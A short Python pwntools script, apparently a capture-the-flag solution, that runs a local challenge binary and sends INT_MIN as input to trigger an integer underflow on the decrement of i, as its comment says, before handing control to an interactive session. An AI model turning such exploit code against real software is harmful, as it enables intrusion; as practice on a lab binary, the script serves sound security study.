import pwn

if __name__ == "__main__":
    target = pwn.process("./a.out")

    # On line 19 of challenge.c, --i will underflow if i == INT_MIN.
    # On an x86_64 Linux system, INT_MIN is -2^31.
    payload = str(-(2 ** 31)).encode()

    target.sendline(payload)
    target.interactive()
